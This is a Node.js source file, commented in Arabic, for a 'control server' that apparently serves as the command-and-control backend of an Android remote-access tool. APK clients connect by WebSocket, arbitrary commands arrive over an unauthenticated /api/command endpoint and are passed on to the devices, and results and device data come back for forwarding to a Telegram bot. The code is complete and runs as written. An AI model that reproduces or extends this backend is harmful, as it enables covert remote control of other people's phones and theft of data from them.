const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const crypto = require('crypto');
const config = require('./config');

class ControlServer {
    constructor() {
        this.app = express();
        this.server = http.createServer(this.app);
        this.wss = new WebSocket.Server({ server: this.server });
        
        this.connectedDevices = new Map();
        this.setupServer();
    }

    setupServer() {
        // Middleware
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true }));
        
        // ✅ endpoints متوافقة مع APK
        this.app.post('/api/register', (req, res) => {
            this.handleDeviceRegistration(req, res);
        });

        this.app.post('/api/command', (req, res) => {
            this.handleBotCommand(req, res);
        });

        this.app.post('/api/data', (req, res) => {
            this.handleDeviceData(req, res);
        });

        this.app.get('/api/devices', (req, res) => {
            this.getConnectedDevices(req, res);
        });

        // WebSocket للاتصال المباشر مع APK
        this.setupWebSocket();
        
        this.startServer();
    }

    setupWebSocket() {
        this.wss.on('connection', (ws, req) => {
            const deviceId = this.generateDeviceId();
            
            const deviceData = {
                deviceId: deviceId,
                ws: ws,
                connected: true,
                lastSeen: new Date(),
                ip: req.socket.remoteAddress
            };

            this.connectedDevices.set(deviceId, deviceData);
            console.log(`📱 جهاز متصل: ${deviceId}`);

            ws.on('message', (data) => {
                this.handleDeviceMessage(deviceId, data);
            });

            ws.on('close', () => {
                this.handleDeviceDisconnect(deviceId);
            });

            // إرسال رسالة ترحيب للجهاز
            ws.send(JSON.stringify({
                type: 'welcome',
                deviceId: deviceId,
                server_time: Date.now()
            }));
        });
    }

    // ✅ معالجة أوامر البوت
    handleBotCommand(req, res) {
        const { command, parameters } = req.body;
        
        // الحصول على أول جهاز متصل (يمكن تعديله ليدعم أجهزة متعددة)
        const device = Array.from(this.connectedDevices.values())
            .find(d => d.connected);

        if (!device) {
            return res.json({ 
                status: 'error', 
                message: 'لا توجد أجهزة متصلة' 
            });
        }

        try {
            // إرسال الأمر للجهاز عبر WebSocket
            device.ws.send(JSON.stringify({
                type: 'command',
                command: command,
                parameters: parameters || {},
                timestamp: Date.now()
            }));

            console.log(`📨 أمر مرسل للجهاز ${device.deviceId}: ${command}`);
            
            res.json({ 
                status: 'success', 
                message: 'تم إرسال الأمر للجهاز',
                device: device.deviceId
            });

        } catch (error) {
            res.json({ 
                status: 'error', 
                message: 'فشل إرسال الأمر: ' + error.message 
            });
        }
    }

    // ✅ استقبال البيانات من الأجهزة
    handleDeviceMessage(deviceId, data) {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                case 'heartbeat':
                    this.updateDeviceHeartbeat(deviceId);
                    break;
                    
                case 'command_result':
                    this.handleCommandResult(deviceId, message);
                    break;
                    
                case 'data_response':
                    this.handleDataResponse(deviceId, message);
                    break;
                    
                case 'error':
                    console.error(`❌ خطأ من ${deviceId}:`, message.error);
                    break;
            }
        } catch (error) {
            console.error(`❌ خطأ في معالجة رسالة ${deviceId}:`, error);
        }
    }

    handleDeviceRegistration(req, res) {
        const { device_id, device_info } = req.body;
        
        const sessionId = this.generateSessionId();
        const deviceData = {
            deviceId: device_id,
            deviceInfo: device_info,
            sessionId: sessionId,
            connected: true,
            lastSeen: new Date()
        };

        this.connectedDevices.set(device_id, deviceData);

        res.json({
            status: 'success',
            session_id: sessionId,
            server_time: Date.now()
        });
    }

    handleDeviceData(req, res) {
        const { device_id, data_type, data } = req.body;
        console.log(`📊 بيانات من ${device_id}: ${data_type}`);
        res.json({ status: 'success' });
    }

    getConnectedDevices(req, res) {
        const devices = Array.from(this.connectedDevices.values())
            .map(device => ({
                deviceId: device.deviceId,
                connected: device.connected,
                lastSeen: device.lastSeen
            }));

        res.json({ devices: devices });
    }

    // 🔧 وظائف مساعدة
    generateDeviceId() {
        return 'device_' + crypto.randomBytes(8).toString('hex');
    }

    generateSessionId() {
        return 'sess_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
    }

    updateDeviceHeartbeat(deviceId) {
        const device = this.connectedDevices.get(deviceId);
        if (device) {
            device.lastSeen = new Date();
        }
    }

    handleDeviceDisconnect(deviceId) {
        const device = this.connectedDevices.get(deviceId);
        if (device) {
            device.connected = false;
            console.log(`🔌 جهاز متقطع: ${deviceId}`);
        }
    }

    handleCommandResult(deviceId, result) {
        console.log(`✅ نتيجة أمر من ${deviceId}:`, result);
    }

    handleDataResponse(deviceId, data) {
        console.log(`📊 بيانات من ${deviceId}:`, data.data_type);
        // هنا يمكن إرسال البيانات للبوت التلجرام
    }

    startServer() {
        this.server.listen(config.SERVER.PORT, config.SERVER.HOST, () => {
            console.log('🚀 سيرفر التحكم يعمل!');
            console.log(`📍 http://${config.SERVER.HOST}:${config.SERVER.PORT}`);
            console.log('📱 جاهز لاستقبال اتصالات الأجهزة');
            console.log('🤖 البوت التلجرام جاهز للأوامر');
        });
    }
}

// تشغيل السيرفر
new ControlServer();
